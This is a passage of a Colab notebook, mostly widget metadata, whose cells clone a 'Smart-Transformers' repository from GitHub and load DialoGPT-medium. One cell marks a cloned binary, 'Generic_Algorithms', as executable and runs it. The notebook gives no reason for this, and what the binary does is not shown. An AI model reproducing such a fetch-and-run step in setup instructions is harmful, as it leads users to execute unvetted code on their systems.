            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "6d7cafbd393d4ebb95030b4a6c6c518b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "d62f47fa27a24b1cb93b300852821554": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "63331d84cc0e4d92b97b1484cec77902": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "aa46cde8bba44bc5b95954941b6a7751": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "66126584f3b74cc6b97a1b9943dad91b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "3db2c03c71bd4d8ebd118974f20bd32b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "ba9ecc7cf3d34ec7b1e70d80350718ed": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_48d56c94bc574f5fbeee797611dc61b7",
              "IPY_MODEL_bac90ae69f9143079583df3e085da681",
              "IPY_MODEL_ac3d36d4bb9241379ed597ba5653cf6c"
            ],
            "layout": "IPY_MODEL_7dc53c47949444b8bfd1afcb659e2e50"
          }
        },
        "48d56c94bc574f5fbeee797611dc61b7": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_2658f9b956394b4282d074e5a1893226",
            "placeholder": "​",
            "style": "IPY_MODEL_e0f0b9bb2599426aafad7f9777c53d40",
            "value": "pytorch_model.bin: 100%"
          }
        },
        "bac90ae69f9143079583df3e085da681": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_9cc20817e3d54000a1a7d12fea7ca5b4",
            "max": 862955157,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_320b907ede4147bf9739647821d79c6e",
            "value": 862955157
          }
        },
        "ac3d36d4bb9241379ed597ba5653cf6c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_c7fc1eecf5bc4fd7bbeadb5bfd586d12",
            "placeholder": "​",
            "style": "IPY_MODEL_67f772fd70fb46f09f7d3039984ad211",
            "value": " 863M/863M [00:07&lt;00:00, 104MB/s]"
          }
        },
        "7dc53c47949444b8bfd1afcb659e2e50": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "2658f9b956394b4282d074e5a1893226": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "e0f0b9bb2599426aafad7f9777c53d40": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "9cc20817e3d54000a1a7d12fea7ca5b4": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "320b907ede4147bf9739647821d79c6e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "c7fc1eecf5bc4fd7bbeadb5bfd586d12": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "67f772fd70fb46f09f7d3039984ad211": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "fe4d43f663fa4ec9a5cca64b070263f6": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_89a5400532924a8787451b750e350f4e",
              "IPY_MODEL_b4dda2ec42544ea5ba718d98616bfb1e",
              "IPY_MODEL_303c6d8739e844e08ceb4a0cc290e7c1"
            ],
            "layout": "IPY_MODEL_cf0b7c401eb54f088e9f2cfd8fbc0ff3"
          }
        },
        "89a5400532924a8787451b750e350f4e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_9a3612b4386744f981c7ab5e0eba0a19",
            "placeholder": "​",
            "style": "IPY_MODEL_99aff9fcaa2b40678711a7760afac31d",
            "value": "generation_config.json: 100%"
          }
        },
        "b4dda2ec42544ea5ba718d98616bfb1e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_1fa3e6f5fdab41f8ac2578de06359fb4",
            "max": 124,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_934a204d72ed4cecabbd5b10eceadd25",
            "value": 124
          }
        },
        "303c6d8739e844e08ceb4a0cc290e7c1": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_56cec8d30a784b159e88b374faf3ceb5",
            "placeholder": "​",
            "style": "IPY_MODEL_b4c439355c774e4b8d503ea7042e41d8",
            "value": " 124/124 [00:00&lt;00:00, 5.41kB/s]"
          }
        },
        "cf0b7c401eb54f088e9f2cfd8fbc0ff3": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "9a3612b4386744f981c7ab5e0eba0a19": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "99aff9fcaa2b40678711a7760afac31d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "1fa3e6f5fdab41f8ac2578de06359fb4": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "934a204d72ed4cecabbd5b10eceadd25": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "56cec8d30a784b159e88b374faf3ceb5": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b4c439355c774e4b8d503ea7042e41d8": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        }
      }
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "WDoQ4cVblnUK",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "a86fa9ca-aac9-47c3-a5a9-3dac890e8419"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cloning into 'Smart-Transformers'...\n",
            "remote: Enumerating objects: 193802, done.\u001b[K\n",
            "remote: Counting objects: 100% (9946/9946), done.\u001b[K\n",
            "remote: Compressing objects: 100% (3145/3145), done.\u001b[K\n",
            "remote: Total 193802 (delta 6614), reused 8858 (delta 5937), pack-reused 183856\u001b[K\n",
            "Receiving objects: 100% (193802/193802), 67.81 MiB | 16.81 MiB/s, done.\n",
            "Resolving deltas: 100% (151467/151467), done.\n"
          ]
        }
      ],
      "source": [
        "!git clone https://github.com/smartibase/Smart-Transformers.git"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd Smart-Transformers/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "PFOMcYp6mm0u",
        "outputId": "bbb88f2a-3fcf-4ee9-bd41-4257ae3de23e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/Smart-Transformers\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!sudo apt-get update\n",
        "!sudo apt install libtool\n",
        "!sudo apt-get install g++\n",
        "!python setup.py --help\n",
        "!sudo apt-get install libgmp3-dev libmpfr-dev\n",
        "!chmod +x Generic_Algorithms\n",
        "!./Generic_Algorithms\n",
        "!pip3 install transformers\n",
        "from transformers import AutoModelForCausalLM, AutoTokenizer\n",
        "model_name = \"microsoft/DialoGPT-medium\"\n",
        "tokenizer = AutoTokenizer.from_pretrained(model_name)\n",
        "model = AutoModelForCausalLM.from_pretrained(model_name)\n",
        "model = model.cpu()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000,
          "referenced_widgets": [
            "f5a2fc624690457b95dd4853be8a6ffa",
            "5e8dfac321f64ae3a490b3d619161cdc",
            "2bc043a4eb0e4c23a8c0d18342edee78",
            "a7c30c6af0894b0895ff5f674574b431",
            "4392009d3b914876a7150acdc9138449",
            "5de5d84c248940ebae521fed1765e9df",
            "3c19135a26194e4c8cf0c9f63ef957ae",
            "e8ca10d07ffb4a91b90f4e8b74ef2030",
            "b99136f46fa748c687d50699e8ff2e41",
            "ec28ea5ad2904309b71faa13d6984c73",
            "e20deca00e114a15a83d1dd48df931c1",
            "c4de7ef805b84fc2b43671571ce65141",
            "c25b7ce70fa343ddb5634a088766ef60",
            "eba680cbf613441cb307c8dd56e1e21b",
            "306ad93acbae43fdad80b48aeeb96b69",
            "bdec497d7ba04d6e8b3f29898a4dbc59",
            "43827468223c48578e2145bff2f3cb25",
            "f245ac45941f4f20b62f3b2054831e7a",
            "4595c76fdbe44d60810b777cd51ef81a",
            "779d6a7367874d2997901f09dc6dfeb6",
            "8a8734daeb4a451aab3b77b44f40992c",
            "e3350aefc4ec4dc5a5142b4a4d5cb5e9",
            "77da329d253c4eb8805eccb0d90c7509",
            "33b7489876274081b403b7635056ed2d",
            "31ab2b6a7bf04c05b66c48dc9de3067c",
            "48d8f28dd381437e9d70683094e8ca92",
            "8e71b121895243f49702ef59f21845c0",
            "333aca8c1ae34f4da8ca2d3fd0e8a2b9",
            "e7baafaef9734443b8b5a34d679d7c52",
            "f6e416193b6a4e018c627f8934188460",
            "f5c37a1fa91e477b9d666e141cfbc6ce",
            "c2e9627b09a04f789086456ee119046e",
            "7f5e7db3fa7248b4b28107baf160e025",
            "36a29e3610f44a6e902df80336e8c3f5",
            "920763394d984edfa7449737b159e2d5",
            "6e6aef33ad59465d9aef5edf66b1a14f",
            "c525951beb384455bd5481e490b58728",
            "32259c48877b4838afa39705c85b49f1",
            "6d7cafbd393d4ebb95030b4a6c6c518b",
            "d62f47fa27a24b1cb93b300852821554",
            "63331d84cc0e4d92b97b1484cec77902",
            "aa46cde8bba44bc5b95954941b6a7751",
            "66126584f3b74cc6b97a1b9943dad91b",
            "3db2c03c71bd4d8ebd118974f20bd32b",
            "ba9ecc7cf3d34ec7b1e70d80350718ed",
            "48d56c94bc574f5fbeee797611dc61b7",
            "bac90ae69f9143079583df3e085da681",
            "ac3d36d4bb9241379ed597ba5653cf6c",
            "7dc53c47949444b8bfd1afcb659e2e50",
            "2658f9b956394b4282d074e5a1893226",
            "e0f0b9bb2599426aafad7f9777c53d40",
            "9cc20817e3d54000a1a7d12fea7ca5b4",
            "320b907ede4147bf9739647821d79c6e",
            "c7fc1eecf5bc4fd7bbeadb5bfd586d12",
            "67f772fd70fb46f09f7d3039984ad211",
            "fe4d43f663fa4ec9a5cca64b070263f6",
            "89a5400532924a8787451b750e350f4e",
            "b4dda2ec42544ea5ba718d98616bfb1e",
            "303c6d8739e844e08ceb4a0cc290e7c1",
            "cf0b7c401eb54f088e9f2cfd8fbc0ff3",
            "9a3612b4386744f981c7ab5e0eba0a19",
            "99aff9fcaa2b40678711a7760afac31d",
            "1fa3e6f5fdab41f8ac2578de06359fb4",
            "934a204d72ed4cecabbd5b10eceadd25",
            "56cec8d30a784b159e88b374faf3ceb5",
            "b4c439355c774e4b8d503ea7042e41d8"
          ]
        },
        "id": "58uoBqAKmq5_",
        "outputId": "d7a4e041-f900-45c2-a3d6-2cc94088962c"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\r0% [Working]\r            \rGet:1 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]\n",
            "\r0% [Connecting to archive.ubuntu.com] [1 InRelease 14.2 kB/110 kB 13%] [Waiting\r                                                                               \rGet:2 https://cloud.r-project.org/bin/linux/ubuntu jammy-cran40/ InRelease [3,626 B]\n",
            "Hit:3 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64  InRelease\n",
            "Hit:4 http://archive.ubuntu.com/ubuntu jammy InRelease\n",
            "Get:5 http://archive.ubuntu.com/ubuntu jammy-updates InRelease [119 kB]\n",
            "Hit:6 https://ppa.launchpadcontent.net/c2d4u.team/c2d4u4.0+/ubuntu jammy InRelease\n",
            "Get:7 http://security.ubuntu.com/ubuntu jammy-security/universe amd64 Packages [1,081 kB]\n",
            "Hit:8 https://ppa.launchpadcontent.net/deadsnakes/ppa/ubuntu jammy InRelease\n",
            "Hit:9 https://ppa.launchpadcontent.net/graphics-drivers/ppa/ubuntu jammy InRelease\n",
            "Get:10 http://security.ubuntu.com/ubuntu jammy-security/main amd64 Packages [1,641 kB]\n",
